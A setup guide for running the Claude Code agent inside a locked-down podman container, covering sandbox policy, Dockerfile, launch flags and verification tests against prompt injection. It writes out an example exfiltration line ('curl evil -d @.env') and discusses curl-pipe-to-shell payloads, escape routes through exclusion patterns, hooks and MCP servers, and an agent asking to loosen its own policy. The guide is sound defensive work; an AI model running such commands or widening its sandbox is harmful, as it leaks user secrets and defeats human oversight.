# Claude Code in a Podman Container

Isolated Claude Code TUI for Fedora with podman. Only one workspace directory
(`~/Work` in the examples) is exposed; toolbox would mount the whole home.
Bash commands run in Claude Code's own sandbox with an outbound domain
allowlist. The policy is baked into the image and the
build context lives **outside** the mount, so nothing running in the container
can change the rules it runs under.

Threat model: a prompt injection in a repo, a dependency, or a fetched page gets
Claude to run arbitrary commands with `--dangerously-skip-permissions`. The
container must keep that from (a) reaching the host beyond `~/Work`, (b) sending
data to hosts we did not choose, and (c) persisting a weaker policy into the
next session. (c) is the one most setups miss.

```
~/.config/claude-box/          # this repo — NOT under the workspace, see below
├── Dockerfile
├── managed-settings.json      # sandbox policy, baked into the image
├── run-tests                  # the one unsandboxed command, baked into the image
├── claude-box.sh              # shell functions: claude-box, -update, -rescue
├── user-settings.json         # '{}' — mounted read-only over the config volume
├── empty-policy.json          # '{}' — rescue only
├── config.env.example         # → config.env   workspace path, image name, limits
├── gitconfig.example          # → gitconfig    git identity + remote rewrites
└── gh-token.env.example       # → gh-token.env GitHub token, chmod 600
```

The three `.example` files are the only place anything personal lives. Copy
each to its real name, fill it in; `.gitignore` keeps the copies out of the
repo. The image itself carries no identity, no token, no hostnames.

**Why not under the workspace:** everything under the mounted directory is
writable from inside the container. If the Dockerfile and policy lived there,
an injection could edit them and wait for the next rebuild to bake in a
weakened policy. Cloning this repo to `~/.config/claude-box` makes the rebuild
trustworthy without a `git status` ritual.

Setup:

```bash
git clone <this repo> ~/.config/claude-box
cd ~/.config/claude-box
cp config.env.example config.env && cp gitconfig.example gitconfig && cp gh-token.env.example gh-token.env
chmod 600 gh-token.env
$EDITOR config.env gitconfig gh-token.env
echo 'source ~/.config/claude-box/claude-box.sh' >> ~/.bashrc && source ~/.bashrc
claude-box-update
```

## 1. `managed-settings.json`

```json
{
  "sandbox": {
    "enabled": true,
    "failIfUnavailable": true,
    "allowUnsandboxedCommands": false,
    "enableWeakerNestedSandbox": true,
    "filesystem": {
      "allowWrite": ["~/.cache", "~/.config", "~/.local", "/tmp"]
    },
    "excludedCommands": ["run-tests", "run-tests *"],
    "network": {
      "strictAllowlist": true,
      "allowManagedDomainsOnly": true,
      "allowedDomains": [
        "host.containers.internal",
        "*.github.com", "github.com",
        "codeload.github.com", "objects.githubusercontent.com",
        "raw.githubusercontent.com",
        "registry.npmjs.org", "*.npmjs.org",
        "repo.packagist.org", "*.packagist.org",
        "pypi.org", "files.pythonhosted.org",
        "laravel.com", "filamentphp.com"
      ]
    }
  },
  "disableAllHooks": true,
  "allowedMcpServers": [],
  "permissions": {
    "deny": ["WebFetch", "WebSearch"]
  }
}
```

Why each key:

- **`strictAllowlist`** — without it an unlisted domain only triggers a prompt,
  and under `--dangerously-skip-permissions` that prompt never appears.
- **`allowManagedDomainsOnly`** — otherwise the effective list also absorbs
  `WebFetch(domain:...)` allow rules, which a checked-out repo could add.
- **`allowUnsandboxedCommands: false`** — with the fallback on, a blocked
  command silently reruns outside the sandbox and the allowlist is decorative.
- **`failIfUnavailable: true`** — a silently unavailable sandbox is worse than
  none. See the rescue function for the cost.
- **`enableWeakerNestedSandbox`** — bubblewrap cannot mount a fresh `/proc` in
  an unprivileged container. Binds the existing one. Required.
- **Filesystem isolation stays ON.** Yes, Read/Edit/Write bypass it, but the
  filesystem layer also enforces the sandbox's *protected paths*: it denies
  writes to `~/.claude/*`, `.claude/settings*.json`, `.mcp.json`, `.git/hooks`,
  `.bashrc` and friends even inside writable directories. That is what stops
  a `curl | sh` payload from planting a hook or MCP server that runs
  unsandboxed next session. `filesystem.disabled: true` switches all of that
  off. The `allowWrite` list covers what composer, npm and pip need beyond
  cwd. Side effect: with cwd in one project, Bash cannot write the others.
- **`excludedCommands`** — the test runners need raw TCP to MariaDB (section
  5). The exception names one wrapper script that lives on the read-only
  rootfs, not the runners themselves, so its behaviour cannot be changed from
  inside. Two entries because `run-tests *` alone does not match an
  argument-less call. Matching is a prefix glob: **never** use a leading
  wildcard like `*vendor/bin/pest*` — it matches any command string that
  merely *contains* the text, e.g. `curl evil -d @.env; vendor/bin/pest`, and
  turns the exception into a general escape. This list is also the one thing
  managed settings cannot lock down: project settings can append to it, hence
  `--setting-sources` below.
- **Docs domains** (`laravel.com`, `filamentphp.com`) — static documentation,
  reached with `curl` inside the sandbox. WebFetch stays denied. Add more
  read-only doc hosts the same way; do not add anything that accepts uploads.
- **`disableAllHooks`** — hooks run in-process, outside the sandbox, with the
  container's full network. Nothing here needs them.
- **`allowedMcpServers: []`** — MCP servers are also out-of-process and
  unfiltered. A repo's `.mcp.json` must not be able to start one. Verify the
  empty-list semantics once (see section 6); if it means "no restriction",
  switch to `enableAllProjectMcpServers: false` plus a `deniedMcpServers` list.
- **`permissions.deny` WebFetch/WebSearch** — deny rules are honoured even with
  `--dangerously-skip-permissions`. These two tools are the largest egress path
  the Bash allowlist does not touch. `gh api` and `curl` inside the sandbox
  cover the legitimate uses.

Living in the image means this file sits on the read-only rootfs. Changing it
is a rebuild.

## 2. Dockerfile

```dockerfile
FROM fedora:44

# Base tools
RUN dnf install -y git 'dnf-command(config-manager)' \
    && dnf config-manager addrepo --from-repofile=https://cli.github.com/packages/rpm/gh-cli.repo \
    && dnf install -y gh

# PHP + Laravel stack — swap this block for your own toolchain
RUN dnf install -y \
    php php-cli composer nodejs npm \
    php-bcmath php-intl php-gd php-mysqlnd php-mbstring php-xml php-zip \
    php-sodium php-opcache php-pdo php-pecl-redis6 \
    mariadb sqlite poppler-utils ffmpeg-free \
    && dnf clean all

# CLI tools the agent reaches for constantly. findutils/diffutils/procps-ng/
# which/less are not all in the base image and their absence shows up as
# confusing "command not found" failures. gcc/make/python3 are for node-gyp.
RUN dnf install -y \
    make gcc gcc-c++ python3 python3-pip \
    jq yq ripgrep fd-find \
    findutils diffutils procps-ng which less tree \
    curl wget unzip tar rsync \
    openssh-clients ca-certificates \
    ImageMagick ShellCheck \
    && dnf clean all

# Sandbox dependencies — without these the sandbox cannot start
RUN dnf install -y bubblewrap socat && dnf clean all

# Sandbox policy. Must be before USER: /etc/claude-code/ is root-owned.
COPY managed-settings.json /etc/claude-code/managed-settings.json

# Large Laravel apps exceed PHP's 128M default when loading routes. Fixing it
# here removes the need for `php -d memory_limit=…` prefixes, which would
# otherwise defeat the excludedCommands match.
RUN printf 'memory_limit = 1G\n' > /etc/php.d/99-claude-box.ini

# The only command allowed to run outside the sandbox. Lives on the read-only
# rootfs so nothing inside can change what it does.
COPY --chmod=755 run-tests /usr/local/bin/run-tests

# Match the host user so files in the mounted workspace keep their owner.
ARG UID=1000
RUN useradd -m -u "$UID" claude

USER claude
WORKDIR /workspace


ENV NPM_CONFIG_PREFIX=/home/claude/.npm-global
ENV PATH=/home/claude/.npm-global/bin:$PATH
ENV NPM_CONFIG_CACHE=/home/claude/.cache/npm
ENV DISABLE_AUTOUPDATER=1

# Git identity and remote rewrites are NOT baked in. They come from a
# per-user gitconfig mounted at runtime (GIT_CONFIG_GLOBAL), so the image is
# shareable and contains no personal data.

# CACHE_BUST invalidates only the layers below it, so a rebuild refreshes
# Claude Code without re-downloading the whole Fedora toolchain.
ARG CACHE_BUST=0
RUN npm install -g @anthropic-ai/claude-code \
    && npm install -g @anthropic-ai/sandbox-runtime   # optional seccomp filter
```

`run-tests` is the only thing allowed to run unsandboxed. It picks
`vendor/bin/pest` or `vendor/bin/phpunit` from the current directory, defaults
`DB_HOST` to the host, and does nothing else. Keep it dumb; every line in it
runs with full network.

Build with `claude-box-update` (it passes your `id -u` and a cache-bust arg).

Verify after every rebuild — these have failed silently before:

```bash
podman run --rm claude-code git config --global --get-all url."https://github.com/".insteadOf   # 3 lines
podman run --rm claude-code git config --global user.email                                      # wrong email = commits attributed to nobody
podman run --rm claude-code cat /etc/claude-code/managed-settings.json                          # policy actually in the image
podman run --rm claude-code claude --version                                                    # >= 2.1.219 for strictAllowlist
```

Unknown settings keys are ignored silently, so a too-old Claude Code turns
`strictAllowlist` into nothing. The version check is not optional.

## 3. Identity and token (one-time, per machine)

**`gitconfig`** — mounted read-only at `/home/claude/.gitconfig` and selected
with `GIT_CONFIG_GLOBAL`. It holds your name and email, the `gh` credential
helper, and `url.<https>.insteadOf` rewrites for every SSH remote form your
repos use. The rewrites exist because SSH host aliases from the host's
`~/.ssh/config` (e.g. `git@github.com-work:`) do not exist inside the
container; without them every push needs a full HTTPS URL, which also breaks
`--force-with-lease`. `insteadOf` is multi-valued, so each rewrite is its own
line — see `gitconfig.example`.

**`gh-token.env`** — `github.com/settings/tokens?type=beta` → fine-grained →
only the repos under the workspace Claude should touch → Contents + Pull
requests, read and write. Add `read:org` if `gh` needs org resources. Passed
with `--env-file` rather than `-e GH_TOKEN="$(cat …)"`: the latter puts the
token in `podman run`'s argv, which sits in `/proc/<pid>/cmdline`
(world-readable) for the entire session. Set a calendar reminder for the
expiry.

**`config.env`** — workspace path, image name, DB host, resource limits.

## 4. `claude-box`

`claude-box.sh` defines three functions. `claude-box` is the daily entry point;
`claude-box-update` rebuilds; `claude-box-rescue` is described below. Read the
script — it is short — but the shape is:

```bash
podman run -it --rm \
  -w /workspace/<project>              # derived from $PWD, see below
  -v "$WORKSPACE:/workspace:z" \
  -v claude-code-config:/home/claude/.claude \
  -v claude-cache:/home/claude/.cache \
  -v gitconfig:/home/claude/.gitconfig:ro,z  -e GIT_CONFIG_GLOBAL=/home/claude/.gitconfig \
  -v user-settings.json:/home/claude/.claude/settings.json:ro,z \
  --read-only \
  --tmpfs /tmp:rw,size=2g,mode=1777 \
  --tmpfs /home/claude/.config:rw,size=64m \
  --tmpfs /home/claude/.local:rw,size=256m \
  -e CLAUDE_CONFIG_DIR=/home/claude/.claude -e DB_HOST=host.containers.internal \
  --env-file gh-token.env \
  --userns=keep-id --security-opt no-new-privileges \
  --security-opt label=type:container_engine_t --cap-drop=ALL \
  --memory=8g --cpus=4 --pids-limit=2048 \
  claude-code claude --setting-sources user "$@"
```

**`-w` follows your shell's cwd.** Run `claude-box` from inside a project and
the session starts there. With filesystem isolation on, Bash can write cwd and
below, so starting at the mount root would make every project writable.

Two additions compared to the obvious invocation:

**`--setting-sources user`** drops project and local settings
(`.claude/settings.json`, `.claude/settings.local.json`) from the session.
Managed settings always load. This is the only way to stop a checked-out repo
from appending to `excludedCommands`, which managed settings cannot lock.
Cost: per-project permission rules and `env` blocks in those files are ignored.
`CLAUDE.md` is not a settings file and still loads.

**Read-only `settings.json` over the config volume.** User settings are the
remaining scope that can widen `excludedCommands`, and the Edit tool can write
the volume even with filesystem isolation on. Mounting `{}` read-only over it
closes that. Everything else in the volume (login, history, session state)
stays writable.

The flags that are easy to get wrong:

**`:z` lowercase, never `:Z`.** Uppercase relabels the tree with a private
SELinux MCS category pair, regenerated on every `podman run`. A second container
mounting the same folder relabels it and the first instantly loses access —
symptom is every command failing with a bare exit code 1, no output, even
`echo`. Fix: `chcon -R -t container_file_t -l s0 ~/Work`, and grep your project
compose files for `:Z` too.

**`--security-opt label=type:container_engine_t`** is required for the sandbox.
Without it bubblewrap cannot mount devpts and every Bash command fails with
`bwrap: Can't mount devpts on /dev/pts: Permission denied`. The AVC shows the
denial against `container_t`, i.e. it is SELinux, not seccomp — `seccomp=
unconfined` and `--cap-add SYS_ADMIN` are the wrong track. Be honest about the
cost: `container_engine_t` is the type for engines running inside containers
and is materially more permissive than `container_t`. SELinux stays enforcing,
but this container is less confined than a plain one.

## 5. Reaching the dev servers and the database

`localhost` inside the container is the container's own loopback. Host services
are reached at **`host.containers.internal:<port>`**, and they must bind
`0.0.0.0` — a server on `127.0.0.1` is unreachable from here:

```bash
ss -tlnp | grep 8000     # 0.0.0.0:8000 good, 127.0.0.1:8000 not reachable
```

**The sandbox proxy only carries HTTP and HTTPS.** Raw TCP has no route, so the
MySQL wire protocol cannot get through — `curl host.containers.internal:8000`
returns 200 while `/dev/tcp/host.containers.internal/3306` reports `Network is
unreachable`. No allowlist entry changes this; it is a protocol limit, not a
domain decision.

Consequence: projects whose tests hit a database on the host need their test
runner outside the sandbox. That is what `run-tests` is for: excluded
from the sandbox, full network, no prompt.

**Do not fight the `.env`.** A typical `.env` says `DB_HOST=127.0.0.1`, which
is the container's own loopback. Laravel loads `.env` immutably, so a real
environment variable wins: `claude-box` sets `DB_HOST` (from `config.env`) for
the whole session and `run-tests` defaults it too. No `DB_HOST=…` prefix
on the command line, ever — a prefix in front of the command is exactly what
makes an `excludedCommands` pattern stop matching. Check `phpunit.xml` in the
database-backed projects for an `<env name="DB_HOST">` override, which would
win over both. Projects that test against SQLite in-memory run sandboxed with
no exception at all. The clean fix is the database and the box on a shared
podman network; moving test suites to SQLite retires the exception entirely.

## 6. Verifying the whole thing works

Do this after every rebuild. In a session, **without** a leading `!` — a `!`
prefix runs outside the sandbox and measures the container, not the policy.

**Policy is loaded.** `/sandbox` → Config tab. Every key from section 1 must
appear resolved; `~/.claude` paths must be listed under *Denied within
allowed*. "Enabled" on the Mode tab means *configured*, not *started* — it says
that while bubblewrap fails on every command.

**Egress.**

```
curl -sS -i -m 5 https://instagram.com/                      # blocked
curl -sS -i -m 5 http://host.containers.internal:8000/       # 200
```

A correct block says so explicitly:

```
curl: (56) CONNECT tunnel failed, response 403
X-Proxy-Error: blocked-by-allowlist
deny network-outbound instagram.com:443 (host is not on the allow list)
```

**The exclusion does what you think.** From a database-backed project, run all three:

```
run-tests                                                    # unsandboxed: reaches the DB, tests run
run-tests --filter=Nothing                                   # same, with an argument
run-tests --version && curl -sS -m 5 https://instagram.com/  # know whether this is blocked
```

The first two confirm the exception *fires*; a `Connection refused` or
`Network is unreachable` from the DB means it did not. The third confirms it
*stops at the excluded command*. That distinction matters: a model inside the
box can easily verify the first and report success without touching the third.

If the second one succeeds, the exclusion matcher is prefix-based and an
injection can ride it. Decide whether that is acceptable before continuing.

**Escalation paths are shut.** Ask Claude to:

- fetch any URL with WebFetch → must be denied;
- add a hook to `~/.claude/settings.json` → the write must fail (read-only
  mount); a hook in a project `.claude/settings.json` must not run (source
  excluded, hooks disabled);
- `claude mcp add`, or a throwaway server in a repo `.mcp.json` → `/mcp` must
  show it blocked. This is the check that confirms `allowedMcpServers: []`
  means "none"; if it doesn't, change the policy per section 1.

**Filesystem layer is on.** From a project cwd, `touch ../other-project/x`
must fail with `Read-only file system`.

Adding a domain means editing `managed-settings.json` and rebuilding. Each
failure names the host in the `deny network-outbound` line.

## What this protects, and what it doesn't

Inside the container Claude sees `/workspace` (the whole workspace directory),
the two volumes, the read-only gitconfig, three tmpfs mounts, and nothing else
from the host — not `~/.ssh`, not the token file, not this repo. Bash egress is limited to the allowlist, enforced by a proxy
outside the sandboxed process, so it survives a prompt injection. WebFetch,
hooks and MCP — the tools that would bypass that proxy — are switched off by
policy the container cannot rewrite.

Remaining gaps:

- **The whole workspace is readable** — every `.env` in every project. Bash
  can only *write* the current project, but the Read tool sees everything.
  Narrowing the mount to one project per launch is the highest-value change
  left.
- **No TLS inspection**, and `*.github.com` is allowed — enough for a determined
  injection to exfiltrate through (gists, issues, a repo the token can write).
- **`GH_TOKEN` is readable inside.** Fine-grained scoping and short expiry are
  the mitigation. Later upgrade: `sandbox.credentials.envVars` with
  `mode: mask` and `injectHosts: ["api.github.com", "github.com"]` keeps the
  real value out of the sandbox entirely; it needs `network.tlsTerminate`,
  which is still experimental.
- **`excludedCommands` runs unsandboxed** with no prompt. One wrapper, two
  patterns, tested in section 6 — including the chaining test.
- **A `CLAUDE.md` at the mount root is not protected.** It sits outside
  any repo, and is writable from any session whose cwd is `/workspace`. Keep
  it short (conventions, "run tests with `run-tests`") and keep the source of
  truth in `~/.config/claude-box/` alongside this note. If it goes missing
  and you didn't remove it, that is a session that ran from the mount root.
- **The config volume holds the login** (`.credentials.json`), so anything that
  mounts it has the session.
- **`container_engine_t`** is looser than `container_t`; the outer boundary is
  a bit thinner than a stock rootless container.

The fix that covers most of this is an egress proxy container plus `--network`:
it applies to the whole container rather than just Bash, removes the nested
bubblewrap dependency, carries raw TCP so the `excludedCommands` exception
could go away, and can terminate TLS.

## Requests from inside the box

The model will, sooner or later, ask for a policy change so it can finish a
task — a wider `excludedCommands` pattern, a domain, an MCP server. That is
normal and usually well-intentioned. Decide it here, on the host, on the
merits: fix the root cause (a wrong `.env` value, a php.ini limit) rather than
loosening the matcher, and never accept a leading-wildcard pattern. A report
from inside that a restriction "works" only shows what the model tested; run
section 6 yourself.

## Habit note

`--dangerously-skip-permissions` is the point of the container and fine inside
it. The risk is muscle memory carrying it to a host terminal. Cleanest fix:

```bash
npm uninstall -g @anthropic-ai/claude-code
```

## Troubleshooting

- **Every Bash command fails** → the sandbox is not starting, and
  `failIfUnavailable` turns that into a hard stop. Read the bwrap error:
  `devpts` means the `container_engine_t` flag is missing from the invocation;
  `proc` means `enableWeakerNestedSandbox` is missing from the policy. Use
  `claude-box-rescue` to get a working session while you fix it.
- **A command fails with `Read-only file system` on a path under `$HOME`** →
  the filesystem layer denied it. If the tool legitimately needs it, add the
  path to `allowWrite` and rebuild; if it's a `~/.claude` or `.git/hooks`
  path, that's the protection working.
- **A tool fails to write under `/home/claude/.config` or `.local`** → tmpfs
  size; raise the `--tmpfs` line, restart, no rebuild.
- `dnf install` does not work inside; add tools to the Dockerfile.
- `pip install --user` works (`/home/claude/.local` is tmpfs) but vanishes on
  exit.
- **Claude Code complains it cannot save a setting** → that's the read-only
  `settings.json`. Intended; put the setting in `managed-settings.json` or
  `user-settings.json` on the host instead.
- `.claude.json` lives inside `CLAUDE_CONFIG_DIR`, i.e. on the config volume.
  If you ever see it demanded at `/home/claude/.claude.json` instead, check
  that `CLAUDE_CONFIG_DIR` survived into the environment before touching
  `--read-only`.
